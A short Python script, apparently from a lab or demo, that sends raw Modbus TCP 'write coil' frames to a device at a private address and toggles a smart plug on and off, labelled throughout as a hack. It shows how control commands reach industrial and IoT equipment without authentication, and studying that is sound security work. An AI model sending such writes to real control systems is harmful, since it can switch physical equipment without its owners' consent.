import socket
import struct
import time
 
# Create a TCP/IP socket
TCP_IP = '10.1.1.35'
TCP_PORT = 502
BUFFER_SIZE = 39
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TCP_IP, TCP_PORT))
 
#try:
# Hack Adress 0x00001 On then Off
unitId = 1 # Plug Socket
functionCode = 5 # Write coil
 
print("\nHack Address 0x00001 ON...")
coilId = 0
req = struct.pack('12B', 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, int(unitId), int(functionCode), 0x00, int(coilId), 0xff, 0x00)
sock.send(req)
print("TX: (%s)" %req)
rec = sock.recv(BUFFER_SIZE)
print("RX: (%s)" %rec)
time.sleep(2)
 
print("\nHack Address 0x00001 OFF...")
coilId = 0
req = struct.pack('12B', 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, int(unitId), int(functionCode), 0x00, int(coilId), 0x00, 0x00)
sock.send(req)
print("TX: (%s)" %req)
rec = sock.recv(BUFFER_SIZE)
print("RX: (%s)" %rec)
time.sleep(2)
 
#finally:
print('\nCLOSING SOCKET')
sock.close()